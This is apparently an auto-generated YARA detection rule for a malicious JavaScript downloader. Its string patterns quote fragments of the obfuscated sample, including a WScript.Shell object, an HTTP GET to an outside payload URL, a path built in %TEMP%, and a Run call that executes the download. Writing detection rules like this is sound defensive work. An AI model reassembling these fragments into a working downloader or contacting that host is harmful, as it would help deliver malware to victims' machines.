rule sig_20160427_d9540b9931fa4aa4f5411dc3e804a497 {
  meta:
    description = "datamaliciousorder - file 20160427_d9540b9931fa4aa4f5411dc3e804a497.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "530d6ba59edb414848ac20f118ebad11ad20e2d8d47b03dbdaf71ad1502dda48"

  strings:
    $s1  = "AlxmoAkrlx[TbbzjWruav](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function YawqgQtupv() {return AaiioFbpzk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"uzs0O2i" ascii
    $s3  = "function YawqgQtupv() {return AaiioFbpzk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"uzs0O2i" ascii
    $s4  = "function IrkihPpvvj(BagjkQsknz, XepxqDqzns){RiboxUhmdb = RiboxUhmdb * 1; return BagjkQsknz - XepxqDqzns;};" fullword ascii
    $s5  = "var AaiioFbpzk = function LkcwjPtsav() {return DsrcvErikz[AoukwBzlco](\"WScript\"+\".Shell\");}(), KrtklCzwrp = 11;" fullword ascii
    $s6  = "var DsrcvErikz = this[\"WScript\"];" fullword ascii
    $s7  = "if (AlxmoAkrlx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GzltgGemfq(){return MbpcnQgjdv + \"\";};" fullword ascii
    $s9  = "function RhwgfKrdmr() {return ((EnpevOiffd == true) && (EnpevOiffd == DlqscOhsjf)) ? 1 : RiboxUhmdb;};" fullword ascii
    $s10 = "var DlqscOhsjf = false;" fullword ascii
    $s11 = "function SxbwaOavbl()" fullword ascii
    $s12 = "return IrkihPpvvj(KmxieItcbs, TnkfrIvjdz);" fullword ascii
    $s13 = "UwbafTuoas = true;" fullword ascii
    $s14 = "function KpjyiOrvhx(MgiwjNsggs){AaiioFbpzk[\"R\"+\"un\"](MgiwjNsggs, RiboxUhmdb, RiboxUhmdb);};" fullword ascii
    $s15 = "function RkcjnGimsk(DwkktGtmtz) {var DrskhHyowe = (1, 2, 3, 4, 5, DwkktGtmtz); return DrskhHyowe;};" fullword ascii
    $s16 = "var EnpevOiffd = false;" fullword ascii
    $s17 = "function UquqyCleik(){return 23;};" fullword ascii
    $s18 = "}while (BsptcPxaap);" fullword ascii
    $s19 = "function YdzfgRhujp(){return AoukwBzlco;};" fullword ascii
    $s20 = "DlqscOhsjf = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}